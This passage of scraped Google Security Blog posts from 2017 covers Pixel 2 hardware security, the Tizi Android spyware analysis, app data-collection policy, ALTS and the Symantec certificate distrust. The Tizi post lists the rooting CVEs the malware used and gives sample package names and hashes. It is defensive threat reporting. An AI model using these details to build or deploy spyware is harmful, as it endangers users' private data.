TruSpy cache side-channel paper. Because it has its own dedicated flash, it’s harder to interfere with its ability to store state persistently. It loads its operating system and software directly from internal ROM and flash, and it controls all updates to it, so attackers can’t directly tamper with its software to inject malicious code. Tamper-resistant hardware is resilient against many physical fault injection techniques including attempts to run outside normal operating conditions, such as wrong voltage, wrong clock speed, or wrong temperature. This is standardized in specifications such as the SmartCard IC Platform Protection Profile, and tamper-resistant hardware is often certified to these standards. Tamper-resistant hardware is usually housed in a package that is resistant to physical penetration and designed to resist side channel attacks, including power analysis, timing analysis, and electromagnetic sniffing, such as described in the SoC it to EM paper.   Security module in Pixel 2    The new Google Pixel 2 ships with a security module built using tamper-resistant hardware that protects your lock screen and your data against many sophisticated hardware attacks.    In addition to all the benefits already mentioned, the security module in Pixel 2 also helps protect you against software-only attacks:   Because it performs very few functions, it has a super small attack surface. With passcode verification happening in the security module, even in the event of a full compromise elsewhere, the attacker cannot derive your disk encryption key without compromising the security module first. The security module is designed so that nobody, including Google, can update the passcode verification logic to a weakened version without knowing your passcode first.   Summary     Just like many other Google products, such as Chromebooks and Cloud, Android and Pixel are investing in additional hardware protections to make your device more secure. With the new Google Pixel 2, your data is safer against an entire class of sophisticated hardware attacks.      ", "date": "November 14, 2017"},
{"website": "Google-Security", "title": "\nTizi: Detecting and blocking socially engineered spyware on Android\n", "author": ["Posted by Anthony Desnos, Megan Ruthven, and Richard Neal, Google Play Protect security engineers and Clement Lecigne, Threat Analysis Group"], "link": "https://security.googleblog.com/2017/11/tizi-detecting-and-blocking-socially.html", "abstract": "                             Posted by Anthony Desnos, Megan Ruthven, and Richard Neal, Google Play Protect security engineers and Clement Lecigne, Threat Analysis Group     Google is constantly working to improve our systems that protect users from Potentially Harmful Applications (PHAs). Usually, PHA authors attempt to install their harmful apps on as many devices as possible. However, a few PHA authors spend substantial effort, time, and money to create and install their harmful app on a small number of devices to achieve a certain goal.    This blog post covers Tizi, a backdoor family with some rooting capabilities that was used in a targeted attack against devices in African countries, specifically: Kenya, Nigeria, and Tanzania. We'll talk about how the Google Play Protect and Threat Analysis teams worked together to detect and investigate Tizi-infected apps and remove and block them from Android devices.   What is Tizi?     Tizi is a fully featured backdoor that installs spyware to steal sensitive data from popular social media applications. The Google Play Protect security team discovered this family in September 2017 when device scans found an app with rooting capabilities that exploited old vulnerabilities. The team used this app to find more applications in the Tizi family, the oldest of which is from October 2015. The Tizi app developer also created a website and used social media to encourage more app installs from Google Play and third-party websites.    Here is an example social media post promoting a Tizi-infected app:                 What is the scope of Tizi?                       What are we doing?          To protect Android devices and users, we used Google Play Protect to disable Tizi-infected apps on affected devices and have notified users of all known affected devices. The developers' accounts have been suspended from Play.         The Google Play Protect team also used information and signals from the Tizi apps to update Google's  on-device security services  and the systems that search for PHAs. These enhancements have been enabled for all users of our security services and increases coverage for Google Play users and the rest of the Android ecosystem.         Additionally, there is more technical information below to help the security industry in our collective work against PHAs.                   What do I need to do?          Through our investigation, we identified around 1,300 devices affected by Tizi. To reduce the chance of your device being affected by PHAs and other threats, we recommend these 5 basic steps:          Check permissions: &nbsp;Be cautious with apps that request unreasonable permissions. For example, a flashlight app shouldn't need access to send SMS messages.     Enable a secure lock screen  : Pick a PIN, pattern, or password that is easy for you to remember and hard for others to guess.     Update your device  : Keep your device up-to-date with the latest security patches. Tizi exploited older and publicly known security vulnerabilities, so devices that have up-to-date security patches are less exposed to this kind of attack.     Google Play Protect  : Ensure Google Play Protect is enabled.     Locate your device  : Practice finding your device, because you are far more likely to lose your device than install a PHA.              How does Tizi work?            The Google Play Protect team had previously classified some samples as spyware or backdoor PHAs without connecting them as a family. The early Tizi variants didn't have rooting capabilities or obfuscation, but later variants did.         After gaining root, Tizi steals sensitive data from popular social media apps like Facebook, Twitter, WhatsApp, Viber, Skype, LinkedIn, and Telegram. It usually first contacts its command-and-control servers by sending an SMS with the device's GPS coordinates to a specific number. Subsequent command-and-control communications are normally performed over regular HTTPS, though in some specific versions, Tizi uses the  MQTT  messaging protocol with a custom server. The backdoor contains various capabilities common to commercial spyware, such as recording calls from WhatsApp, Viber, and Skype; sending and receiving SMS messages; and accessing calendar events, call log, contacts, photos, Wi-Fi encryption keys, and a list of all installed apps. Tizi apps can also record ambient audio and take pictures without displaying the image on the device's screen.         Tizi can root the device by exploiting one of the following local vulnerabilities:       CVE-2012-4220   CVE-2013-2596   CVE-2013-2597   CVE-2013-2595   CVE-2013-2094   CVE-2013-6282   CVE-2014-3153   CVE-2015-3636   CVE-2015-1805      Most of these vulnerabilities target older chipsets, devices, and Android versions. All of the listed vulnerabilities are fixed on devices with a security patch level of April 2016 or later, and most of them were patched considerably prior to this date. Devices with this patch level or later are far less exposed to Tizi's capabilities. If a Tizi app is unable to take control of a device because the vulnerabilities it tries to use are are all patched, it will still attempt to perform some actions through the high level of permissions it asks the user to grant to it, mainly around reading and sending SMS messages and monitoring, redirecting, and preventing outgoing phone calls.                   Samples uploaded to VirusTotal            To encourage further research in the security community, here are some sample applications embedding Tizi that were already on VirusTotal.                           Package name        SHA256 digest        SHA1 certificate           com.press.nasa.com.tanofresh        4d780a6fc18458311250d4d1edc750  468fdb9b3e4c950dce5b35d4567b47  d4a7        816bbee3cab5eed00b8bd16df56032  a96e243201           com.dailyworkout.tizi        7c6af091a7b0f04fb5b212bd3c180d  dcc6abf7cd77478fd22595e5b7aa7c  fd9f        404b4d1a7176e219eaa457b0050b40  81c22a9a1a           com.system.update.systemupdate        7a956c754f003a219ea1d2205de3ef  5bc354419985a487254b8aeb865442  a55e        4d2962ac1f6551435709a5a874595d  855b1fa8ab                              Additional digests linked to Tizi            To encourage further research in the security community, here are some sample digests of exploits and utilities that were used or abused by Tizi.                       Filename        SHA256 digest           run_root_shell        f2e45ea50fc71b62d9ea59990ced75  5636286121437ced6237aff9098138  8f6a           iovyroot        4d0887f41d0de2f31459c14e3133de  bcdf758ad8bbe57128d3bec2c907f2  acf3           filesbetyangu.tar        9869871ed246d5670ebca02bb265a5  84f998f461db0283103ba58d4a6503  33be                                              Posted by Anthony Desnos, Megan Ruthven, and Richard Neal, Google Play Protect security engineers and Clement Lecigne, Threat Analysis Group  Google is constantly working to improve our systems that protect users from Potentially Harmful Applications (PHAs). Usually, PHA authors attempt to install their harmful apps on as many devices as possible. However, a few PHA authors spend substantial effort, time, and money to create and install their harmful app on a small number of devices to achieve a certain goal.  This blog post covers Tizi, a backdoor family with some rooting capabilities that was used in a targeted attack against devices in African countries, specifically: Kenya, Nigeria, and Tanzania. We'll talk about how the Google Play Protect and Threat Analysis teams worked together to detect and investigate Tizi-infected apps and remove and block them from Android devices. What is Tizi?  Tizi is a fully featured backdoor that installs spyware to steal sensitive data from popular social media applications. The Google Play Protect security team discovered this family in September 2017 when device scans found an app with rooting capabilities that exploited old vulnerabilities. The team used this app to find more applications in the Tizi family, the oldest of which is from October 2015. The Tizi app developer also created a website and used social media to encourage more app installs from Google Play and third-party websites.  Here is an example social media post promoting a Tizi-infected app:      What is the scope of Tizi?        What are we doing?    To protect Android devices and users, we used Google Play Protect to disable Tizi-infected apps on affected devices and have notified users of all known affected devices. The developers' accounts have been suspended from Play.    The Google Play Protect team also used information and signals from the Tizi apps to update Google's on-device security services and the systems that search for PHAs. These enhancements have been enabled for all users of our security services and increases coverage for Google Play users and the rest of the Android ecosystem.    Additionally, there is more technical information below to help the security industry in our collective work against PHAs.      What do I need to do?    Through our investigation, we identified around 1,300 devices affected by Tizi. To reduce the chance of your device being affected by PHAs and other threats, we recommend these 5 basic steps:    Check permissions: Be cautious with apps that request unreasonable permissions. For example, a flashlight app shouldn't need access to send SMS messages. Enable a secure lock screen: Pick a PIN, pattern, or password that is easy for you to remember and hard for others to guess. Update your device: Keep your device up-to-date with the latest security patches. Tizi exploited older and publicly known security vulnerabilities, so devices that have up-to-date security patches are less exposed to this kind of attack. Google Play Protect: Ensure Google Play Protect is enabled. Locate your device: Practice finding your device, because you are far more likely to lose your device than install a PHA.     How does Tizi work?    The Google Play Protect team had previously classified some samples as spyware or backdoor PHAs without connecting them as a family. The early Tizi variants didn't have rooting capabilities or obfuscation, but later variants did.    After gaining root, Tizi steals sensitive data from popular social media apps like Facebook, Twitter, WhatsApp, Viber, Skype, LinkedIn, and Telegram. It usually first contacts its command-and-control servers by sending an SMS with the device's GPS coordinates to a specific number. Subsequent command-and-control communications are normally performed over regular HTTPS, though in some specific versions, Tizi uses the MQTT messaging protocol with a custom server. The backdoor contains various capabilities common to commercial spyware, such as recording calls from WhatsApp, Viber, and Skype; sending and receiving SMS messages; and accessing calendar events, call log, contacts, photos, Wi-Fi encryption keys, and a list of all installed apps. Tizi apps can also record ambient audio and take pictures without displaying the image on the device's screen.    Tizi can root the device by exploiting one of the following local vulnerabilities:   CVE-2012-4220 CVE-2013-2596 CVE-2013-2597 CVE-2013-2595 CVE-2013-2094 CVE-2013-6282 CVE-2014-3153 CVE-2015-3636 CVE-2015-1805   Most of these vulnerabilities target older chipsets, devices, and Android versions. All of the listed vulnerabilities are fixed on devices with a security patch level of April 2016 or later, and most of them were patched considerably prior to this date. Devices with this patch level or later are far less exposed to Tizi's capabilities. If a Tizi app is unable to take control of a device because the vulnerabilities it tries to use are are all patched, it will still attempt to perform some actions through the high level of permissions it asks the user to grant to it, mainly around reading and sending SMS messages and monitoring, redirecting, and preventing outgoing phone calls.       Samples uploaded to VirusTotal    To encourage further research in the security community, here are some sample applications embedding Tizi that were already on VirusTotal.       Package name  SHA256 digest  SHA1 certificate   com.press.nasa.com.tanofresh  4d780a6fc18458311250d4d1edc750468fdb9b3e4c950dce5b35d4567b47d4a7  816bbee3cab5eed00b8bd16df56032a96e243201   com.dailyworkout.tizi  7c6af091a7b0f04fb5b212bd3c180ddcc6abf7cd77478fd22595e5b7aa7cfd9f  404b4d1a7176e219eaa457b0050b4081c22a9a1a   com.system.update.systemupdate  7a956c754f003a219ea1d2205de3ef5bc354419985a487254b8aeb865442a55e  4d2962ac1f6551435709a5a874595d855b1fa8ab          Additional digests linked to Tizi    To encourage further research in the security community, here are some sample digests of exploits and utilities that were used or abused by Tizi.      Filename  SHA256 digest   run_root_shell  f2e45ea50fc71b62d9ea59990ced755636286121437ced6237aff90981388f6a   iovyroot  4d0887f41d0de2f31459c14e3133debcdf758ad8bbe57128d3bec2c907f2acf3   filesbetyangu.tar  9869871ed246d5670ebca02bb265a584f998f461db0283103ba58d4a650333be        ", "date": "November 27, 2017"},
{"website": "Google-Security", "title": "\nAdditional protections by Safe Browsing for Android users\n", "author": ["Posted by Paul Stanton and Brooke Heinichen, Safe Browsing Team"], "link": "https://security.googleblog.com/2017/12/additional-protections-by-safe-browsing.html", "abstract": "                             Posted by Paul Stanton and Brooke Heinichen, Safe Browsing Team      Updated on 12/14/17 to further distinguish between Unwanted Software Policy and Google Play Developer Program Policy   In our efforts to protect users and serve developers, the Google Safe Browsing team has expanded enforcement of Google's  Unwanted Software Policy  to further tamp down on unwanted and harmful mobile behaviors on Android. As part of this expanded enforcement, Google Safe Browsing will show warnings on apps and on websites leading to apps that collect a user&#8217;s personal data without their consent.    Apps handling personal user data (such as user phone number or email), or device data will be required to prompt users and to provide their own privacy policy in the app. Additionally, if an app collects and transmits personal data unrelated to the functionality of the app then, prior to collection and transmission, the app must prominently highlight how the user data will be used and have the user provide affirmative consent for such use.    These data collection requirements apply to all functions of the app. For example, during analytics and crash reportings, the list of installed packages unrelated to the app may not be transmitted from the device without prominent disclosure and affirmative consent.    These requirements, under the Unwanted Software Policy, apply to apps in Google Play and non-Play app markets. The Google Play team has also published guidelines for how Play apps should  handle user data  and  provide disclosure.     Starting in 60 days, this expanded enforcement of Google&#8217;s  Unwanted Software Policy  may result in warnings shown on user devices via Google Play Protect or on webpages that lead to these apps. Webmasters whose sites show warnings due to distribution of these apps should refer to the  Search Console  for guidance on remediation and resolution of the warnings. Developers whose apps show warnings should refer to guidance in the  Unwanted Software Help Center . Developers can also request an app review using this article on  App verification and appeals , which contains guidance applicable to apps in both Google Play and non-Play app stores. Apps published in Google Play have specific criteria to meet under Google Play&#8217;s Developer Program Policies; these criteria are outlined in the Play  August 2017 announcement.                                    Posted by Paul Stanton and Brooke Heinichen, Safe Browsing Team  Updated on 12/14/17 to further distinguish between Unwanted Software Policy and Google Play Developer Program Policy In our efforts to protect users and serve developers, the Google Safe Browsing team has expanded enforcement of Google's Unwanted Software Policy to further tamp down on unwanted and harmful mobile behaviors on Android. As part of this expanded enforcement, Google Safe Browsing will show warnings on apps and on websites leading to apps that collect a user’s personal data without their consent.  Apps handling personal user data (such as user phone number or email), or device data will be required to prompt users and to provide their own privacy policy in the app. Additionally, if an app collects and transmits personal data unrelated to the functionality of the app then, prior to collection and transmission, the app must prominently highlight how the user data will be used and have the user provide affirmative consent for such use.  These data collection requirements apply to all functions of the app. For example, during analytics and crash reportings, the list of installed packages unrelated to the app may not be transmitted from the device without prominent disclosure and affirmative consent.  These requirements, under the Unwanted Software Policy, apply to apps in Google Play and non-Play app markets. The Google Play team has also published guidelines for how Play apps should handle user data and provide disclosure.  Starting in 60 days, this expanded enforcement of Google’s Unwanted Software Policy may result in warnings shown on user devices via Google Play Protect or on webpages that lead to these apps. Webmasters whose sites show warnings due to distribution of these apps should refer to the Search Console for guidance on remediation and resolution of the warnings. Developers whose apps show warnings should refer to guidance in the Unwanted Software Help Center. Developers can also request an app review using this article on App verification and appeals, which contains guidance applicable to apps in both Google Play and non-Play app stores. Apps published in Google Play have specific criteria to meet under Google Play’s Developer Program Policies; these criteria are outlined in the Play August 2017 announcement.     ", "date": "December 1, 2017"},
{"website": "Google-Security", "title": "\nSecuring communications between Google services with Application Layer Transport Security\n", "author": ["Posted by Cesar Ghali and Julien Boeuf, Engineers on the Security & Privacy Team"], "link": "https://security.googleblog.com/2017/12/securing-communications-between-google.html", "abstract": "                             Posted by Cesar Ghali and Julien Boeuf, Engineers on the Security &amp; Privacy Team   At Google, protection of customer data is a top priority. One way we do this is by protecting data in transit by default. We protect data when it is sent to Google using secure communication protocols such as TLS (Transport Layer Security). Within our infrastructure, we protect service-to-service communications at the application layer using a system called Application Layer Transport Security (ALTS). ALTS authenticates the communication between Google services and helps protect data in transit. Today, we&#8217;re releasing a whitepaper, &#8220; Application Layer Transport Security ,&#8221; that goes into detail about what ALTS is, how it protects data, and how it&#8217;s implemented at Google.     ALTS is a highly reliable, trusted system that provides authentication and security for our internal Remote Procedure Call (RPC) communications.  ALTS requires minimal involvement from the services themselves. When services communicate with each other at Google, such as the Gmail frontend communicating with a storage backend system, they do not need to explicitly configure anything to ensure data transmission is protected - it is protected by default. All RPCs issued or received by a production workload that stay within a physical boundary controlled by or on behalf of Google are protected with ALTS by default. This delivers numerous benefits while allowing the system work at scale:        More precise security: &nbsp;Each workload has its own identity. This allows workloads running on the same machine to authenticate using their own identity as opposed to the machine&#8217;s identity.    Improved scalability: &nbsp;ALTS accommodates Google&#8217;s massive scale by using an efficient resumption mechanism embedded in the ALTS handshake protocol, allowing services that were already communicating to easily resume communications. ALTS can also accommodate the authentication and encryption needs of a large number of RPCs; for example, services running on Google production systems collectively issue on the order of&nbsp;  O(10  10  )  &nbsp;RPCs per second.    Reduced overhead: &nbsp;The overhead of potentially expensive cryptographic operations can be reduced by supporting long-lived RPC channels.              Multiple features that ensure security and scalability          Inside physical boundaries controlled by or on behalf of Google, all scheduled production workloads are initialized with a certificate that asserts their identity. These credentials are securely delivered to the workloads. When a workload is involved in an ALTS handshake, it verifies the remote peer identity and certificate. To further increase security, all Google certificates have a relatively short lifespan.         ALTS has a flexible trust model that works for different types of entities on the network. Entities can be physical machines, containerized workloads, and even human users to whom certificates can be provisioned.         ALTS provides a handshake protocol, which is a Diffie-Hellman (DH) based authenticated key exchange protocol that Google developed and implemented. At the end of a handshake, ALTS provides applications with an authenticated remote peer identity, which can be used to enforce fine-grained authorization policies at the application layer.                        ALTS ensures the integrity of Google traffic is protected, and encrypted as needed.          After a handshake is complete and the client and server negotiate the necessary shared secrets, ALTS secures RPC traffic by forcing integrity, and optional encryption, using the negotiated shared secrets. We support multiple protocols for integrity guarantees, e.g., AES-GMAC and AES-VMAC with 128-bit keys.  Whenever traffic leaves a physical boundary controlled by or on behalf of Google, e.g., in transit over WAN between datacenters, all protocols are upgraded automatically to provide encryption as well as integrity guarantees.  In this case, we use the AES-GCM and AES-VCM protocols with 128-bit keys.         More details on how Google data encryption is performed are available in another whitepaper we are releasing today, &#8220; Encryption in Transit in Google Cloud .&#8221;         In summary, ALTS is widely used in Google&#8217;s infrastructure to provide service-to-service authentication and integrity, with optional encryption for all Google RPC traffic. For more information about ALTS, please read our whitepaper, &#8220; Application Layer Transport Security .&#8221;                                               Posted by Cesar Ghali and Julien Boeuf, Engineers on the Security & Privacy Team At Google, protection of customer data is a top priority. One way we do this is by protecting data in transit by default. We protect data when it is sent to Google using secure communication protocols such as TLS (Transport Layer Security). Within our infrastructure, we protect service-to-service communications at the application layer using a system called Application Layer Transport Security (ALTS). ALTS authenticates the communication between Google services and helps protect data in transit. Today, we’re releasing a whitepaper, “Application Layer Transport Security,” that goes into detail about what ALTS is, how it protects data, and how it’s implemented at Google.  ALTS is a highly reliable, trusted system that provides authentication and security for our internal Remote Procedure Call (RPC) communications. ALTS requires minimal involvement from the services themselves. When services communicate with each other at Google, such as the Gmail frontend communicating with a storage backend system, they do not need to explicitly configure anything to ensure data transmission is protected - it is protected by default. All RPCs issued or received by a production workload that stay within a physical boundary controlled by or on behalf of Google are protected with ALTS by default. This delivers numerous benefits while allowing the system work at scale:   More precise security: Each workload has its own identity. This allows workloads running on the same machine to authenticate using their own identity as opposed to the machine’s identity. Improved scalability: ALTS accommodates Google’s massive scale by using an efficient resumption mechanism embedded in the ALTS handshake protocol, allowing services that were already communicating to easily resume communications. ALTS can also accommodate the authentication and encryption needs of a large number of RPCs; for example, services running on Google production systems collectively issue on the order of O(1010) RPCs per second. Reduced overhead: The overhead of potentially expensive cryptographic operations can be reduced by supporting long-lived RPC channels.     Multiple features that ensure security and scalability    Inside physical boundaries controlled by or on behalf of Google, all scheduled production workloads are initialized with a certificate that asserts their identity. These credentials are securely delivered to the workloads. When a workload is involved in an ALTS handshake, it verifies the remote peer identity and certificate. To further increase security, all Google certificates have a relatively short lifespan.    ALTS has a flexible trust model that works for different types of entities on the network. Entities can be physical machines, containerized workloads, and even human users to whom certificates can be provisioned.    ALTS provides a handshake protocol, which is a Diffie-Hellman (DH) based authenticated key exchange protocol that Google developed and implemented. At the end of a handshake, ALTS provides applications with an authenticated remote peer identity, which can be used to enforce fine-grained authorization policies at the application layer.        ALTS ensures the integrity of Google traffic is protected, and encrypted as needed.    After a handshake is complete and the client and server negotiate the necessary shared secrets, ALTS secures RPC traffic by forcing integrity, and optional encryption, using the negotiated shared secrets. We support multiple protocols for integrity guarantees, e.g., AES-GMAC and AES-VMAC with 128-bit keys. Whenever traffic leaves a physical boundary controlled by or on behalf of Google, e.g., in transit over WAN between datacenters, all protocols are upgraded automatically to provide encryption as well as integrity guarantees. In this case, we use the AES-GCM and AES-VCM protocols with 128-bit keys.    More details on how Google data encryption is performed are available in another whitepaper we are releasing today, “Encryption in Transit in Google Cloud.”    In summary, ALTS is widely used in Google’s infrastructure to provide service-to-service authentication and integrity, with optional encryption for all Google RPC traffic. For more information about ALTS, please read our whitepaper, “Application Layer Transport Security.”         ", "date": "December 13, 2017"},
{"website": "Google-Security", "title": "\nChrome’s Plan to Distrust Symantec Certificates\n", "author": ["Posted by Devon O’Brien, Ryan Sleevi, Andrew Whalley, Chrome Security"], "link": "https://security.googleblog.com/2017/09/chromes-plan-to-distrust-symantec.html", "abstract": "                             Posted by Devon O&#8217;Brien, Ryan Sleevi, Andrew Whalley, Chrome Security      This post is a broader announcement of  plans already finalized  on the  blink-dev mailing list .    Update, 1/31/18: Post was updated to further clarify 13 month validity limitations       At the end of July, the Chrome team and the PKI community converged upon a  plan  to reduce, and ultimately remove, trust in Symantec&#8217;s infrastructure in order to uphold users&#8217; security and privacy when browsing the web. This plan, arrived at after significant debate on the blink-dev forum, would allow reasonable time for a transition to new, independently-operated Managed Partner Infrastructure while Symantec modernizes and redesigns its infrastructure to adhere to industry standards. This post reiterates this plan and includes a timeline detailing when site operators may need to obtain new certificates.    On January 19, 2017,  a public posting  to the mozilla.dev.security.policy newsgroup drew attention to a series of questionable website authentication certificates issued by Symantec Corporation&#8217;s PKI. Symantec&#8217;s PKI business, which operates a series of Certificate Authorities under various brand names, including Thawte, VeriSign, Equifax, GeoTrust, and RapidSSL, had issued numerous certificates that did not comply with the industry-developed  CA/Browser Forum Baseline Requirements . During the subsequent investigation, it was revealed that Symantec had entrusted several organizations with the ability to issue certificates without the appropriate or necessary oversight, and had been aware of security deficiencies at these organizations for some time.    This incident, while distinct from a  previous incident in 2015 , was part of a continuing pattern of  issues  over the past several years that has caused the Chrome team to lose confidence in the trustworthiness of Symantec&#8217;s infrastructure, and as a result, the certificates that have been or will be issued from it.    After our agreed-upon proposal was circulated, Symantec announced the selection of DigiCert to run this independently-operated Managed Partner Infrastructure, as well as their intention to sell their PKI business to DigiCert in lieu of building a new trusted infrastructure. This post outlines the timeline for that transition and the steps that existing Symantec customers should take to minimize disruption to their users.       Information For Site Operators     Starting with Chrome 66, Chrome will remove trust in Symantec-issued certificates issued prior to June 1, 2016. Chrome 66 is currently  scheduled  to be released to Chrome Beta users on March 15, 2018 and to Chrome Stable users around April 17, 2018.    If you are a site operator with a certificate issued by a Symantec CA prior to June 1, 2016, then prior to the release of Chrome 66, you will need to replace the existing certificate with a new certificate from any Certificate Authority trusted by Chrome.    Additionally, by December 1, 2017, Symantec will transition issuance and operation of publicly-trusted certificates to DigiCert infrastructure, and certificates issued from the old Symantec infrastructure after this date will not be trusted in Chrome.    Around the week of October 23, 2018, Chrome 70 will be released, which will fully remove trust in Symantec&#8217;s old infrastructure and all of the certificates it has issued. This will affect any certificate chaining to Symantec roots, except for the small number issued by the independently-operated and audited subordinate CAs previously disclosed to Google.    Site operators that need to obtain certificates from Symantec&#8217;s existing root and intermediate certificates may do so from the old infrastructure until December 1, 2017, although these certificates will need to be replaced again prior to Chrome 70. Additionally, certificates issued using validation information from Symantec&#8217;s infrastructure will have their validity limited to 13 months. Alternatively, site operators may obtain replacement certificates from any other Certificate Authority currently trusted by Chrome, which are unaffected by this distrust or validity period limit.   Reference Timeline     The following is a timeline of relevant dates associated with this plan, which distills the various requirements and milestones into an actionable set of information for site operators. As always, Chrome release dates can vary by a number of days, but upcoming release dates can be tracked  here .                    Date        Event           Now      through       ~March 15, 2018        Site Operators using Symantec-issued TLS server certificates issued before June 1, 2016 should replace these certificates. These certificates can be replaced by any currently trusted CA.           ~October 24, 2017        Chrome 62 released to Stable, which will add alerting in DevTools when evaluating certificates that will be affected by the Chrome 66 distrust.           December 1, 2017        According to Symantec, DigiCert&#8217;s new &#8220;Managed Partner Infrastructure&#8221; will at this point be capable of full issuance. Any certificates issued by Symantec&#8217;s old infrastructure after this point will cease working in a future Chrome update.        From this date forward, Site Operators can obtain TLS server certificates from the new Managed Partner Infrastructure that will continue to be trusted after Chrome 70 (~October 23, 2018).         December 1, 2017 does not mandate any certificate changes, but represents an opportunity for site operators to obtain TLS server certificates that will not be affected by Chrome 70&#8217;s distrust of the old infrastructure.           ~March 15, 2018        Chrome 66 released to beta, which will remove trust in Symantec-issued certificates with a not-before date prior to June 1, 2016. As of this date Site Operators must be using either a Symantec-issued TLS server certificate issued on or after June 1, 2016 or a currently valid certificate issued from any other trusted CA as of Chrome 66.        Site Operators that obtained a certificate from Symantec&#8217;s old infrastructure after June 1, 2016 are unaffected by Chrome 66 but will need to obtain a new certificate by the Chrome 70 dates described below.           ~April 17, 2018        Chrome 66 released to Stable.           ~September 13, 2018        Chrome 70 released to Beta, which will remove trust in the old Symantec-rooted Infrastructure. This will not affect any certificate chaining to the new Managed Partner Infrastructure, which Symantec has said will be operational by December 1, 2017.        Only TLS server certificates issued by Symantec&#8217;s old infrastructure will be affected by this distrust regardless of issuance date.           ~October 23, 2018        Chrome 70 released to Stable.                                              Posted by Devon O’Brien, Ryan Sleevi, Andrew Whalley, Chrome Security  This post is a broader announcement of plans already finalized on the blink-dev mailing list. Update, 1/31/18: Post was updated to further clarify 13 month validity limitations  At the end of July, the Chrome team and the PKI community converged upon a plan to reduce, and ultimately remove, trust in Symantec’s infrastructure in order to uphold users’ security and privacy when browsing the web. This plan, arrived at after significant debate on the blink-dev forum, would allow reasonable time for a transition to new, independently-operated Managed Partner Infrastructure while Symantec modernizes and redesigns its infrastructure to adhere to industry standards. This post reiterates this plan and includes a timeline detailing when site operators may need to obtain new certificates.  On January 19, 2017, a public posting to the mozilla.dev.security.policy newsgroup drew attention to a series of questionable website authentication certificates issued by Symantec Corporation’s PKI. Symantec’s PKI business, which operates a series of Certificate Authorities under various brand names, including Thawte, VeriSign, Equifax, GeoTrust, and RapidSSL, had issued numerous certificates that did not comply with the industry-developed CA/Browser Forum Baseline Requirements. During the subsequent investigation, it was revealed that Symantec had entrusted several organizations with the ability to issue certificates without the appropriate or necessary oversight, and had been aware of security deficiencies at these organizations for some time.  This incident, while distinct from a previous incident in 2015, was part of a continuing pattern of issues over the past several years that has caused the Chrome team to lose confidence in the trustworthiness of Symantec’s infrastructure, and as a result, the certificates that have been or will be issued from it.  After our agreed-upon proposal was circulated, Symantec announced the selection of DigiCert to run this independently-operated Managed Partner Infrastructure, as well as their intention to sell their PKI business to DigiCert in lieu of building a new trusted infrastructure. This post outlines the timeline for that transition and the steps that existing Symantec customers should take to minimize disruption to their users.  Information For Site Operators  Starting with Chrome 66, Chrome will remove trust in Symantec-issued certificates issued prior to June 1, 2016. Chrome 66 is currently scheduled to be released to Chrome Beta users on March 15, 2018 and to Chrome Stable users around April 17, 2018.  If you are a site operator with a certificate issued by a Symantec CA prior to June 1, 2016, then prior to the release of Chrome 66, you will need to replace the existing certificate with a new certificate from any Certificate Authority trusted by Chrome.  Additionally, by December 1, 2017, Symantec will transition issuance and operation of publicly-trusted certificates to DigiCert infrastructure, and certificates issued from the old Symantec infrastructure after this date will not be trusted in Chrome.  Around the week of October 23, 2018, Chrome 70 will be released, which will fully remove trust in Symantec’s old infrastructure and all of the certificates it has issued. This will affect any certificate chaining to Symantec roots, except for the small number issued by the independently-operated and audited subordinate CAs previously disclosed to Google.  Site operators that need to obtain certificates from Symantec’s existing root and intermediate certificates may do so from the old infrastructure until December 1, 2017, although these certificates will need to be replaced again prior to Chrome 70. Additionally, certificates issued using validation information from Symantec’s infrastructure will have their validity limited to 13 months. Alternatively, site operators may obtain replacement certificates from any other Certificate Authority currently trusted by Chrome, which are unaffected by this distrust or validity period limit. Reference Timeline  The following is a timeline of relevant dates associated with this plan, which distills the various requirements and milestones into an actionable set of information for site operators. As always, Chrome release dates can vary by a number of days, but upcoming release dates can be tracked here.     Date  Event   Now  through   ~March 15, 2018  Site Operators using Symantec-issued TLS server certificates issued before June 1, 2016 should replace these certificates. These certificates can be replaced by any currently trusted CA.   ~October 24, 2017  Chrome 62 released to Stable, which will add alerting in DevTools when evaluating certificates that will be affected by the Chrome 66 distrust.   December 1, 2017  According to Symantec, DigiCert’s new “Managed Partner Infrastructure” will at this point be capable of full issuance. Any certificates issued by Symantec’s old infrastructure after this point will cease working in a future Chrome update.   From this date forward, Site Operators can obtain TLS server certificates from the new Managed Partner Infrastructure that will continue to be trusted after Chrome 70 (~October 23, 2018).    December 1, 2017 does not mandate any certificate changes, but represents an opportunity for site operators to obtain TLS server certificates that will not be affected by Chrome 70’s distrust of the old infrastructure.   ~March 15, 2018  Chrome 66 released to beta, which will remove trust in Symantec-issued certificates with a not-before date prior to June 1, 2016. As of this date Site Operators must be using either a Symantec-issued TLS server certificate issued on or after June 1, 2016 or a currently valid certificate issued from any other trusted CA as of Chrome 66.   Site Operators that obtained a certificate from Symantec’s old infrastructure after June 1, 2016 are unaffected by Chrome 66 but will need to obtain a new certificate by the Chrome 70 dates described below.   ~April 17, 2018  Chrome 66 released to Stable.   ~September 13, 2018  Chrome 70 released to Beta, which will remove trust in the old Symantec-rooted Infrastructure. This will not affect any certificate chaining to the new Managed Partner Infrastructure, which Symantec has said will be operational by December 1, 2017.   Only TLS server certificates issued by Symantec’s old infrastructure will be affected by this distrust regardless of issuance date.   ~October 23, 2018  Chrome 70 released to Stable.        ", "date": "September 11, 2017"},
{"website": "Google-Security", "title": "\nProtecting You Against Phishing\n", "author": ["Posted by Mark Risher, Director, Counter Abuse Technology"], "link": "https://security.googleblog.com/2017/05/protecting-you-against-phishing.html", "abstract": "                             Posted by Mark Risher, Director, Counter Abuse Technology     As many email users know, phishing attacks&#8212;or emails that impersonate a trusted source to trick users into sharing information&#8212;are a pervasive problem. If you use Gmail, you can rest assured that every day, millions of phishing emails are blocked from ever reaching your inbox.    This week, we defended against an email  phishing campaign  that tricked some of our users into inadvertently granting access to their contact information, with the intent to spread more phishing emails. We took quick action to revoke all access granted to the attacker as well as steps to reduce and prevent harm from future variants of this type of attack.    Here&#8217;s some background to help you understand how the campaign worked, how we addressed it, and how you can better protect yourself against attacks.     How the campaign worked and how we addressed it&nbsp;     Victims of this attack received an email that appeared to be an invite to a Google Doc from one of their contacts. When users clicked the link in the attacker&#8217;s email, it directed them to the attacker&#8217;s application, which requested access to the user&#8217;s account under the false pretense of gaining access to the Google Doc. If the user authorized access to the application (through a mechanism called OAuth), it used the user's contact list to send the same message to more people.    Upon detecting this issue, we immediately responded with a combination of automatic and manual actions that ended this campaign within an hour. We removed fake pages and applications, and pushed user-protection updates through Safe Browsing, Gmail, Google Cloud Platform, and other counter-abuse systems. Fewer than 0.1% of our users were affected by this attack, and we have taken steps to re-secure affected accounts.    We protect our users 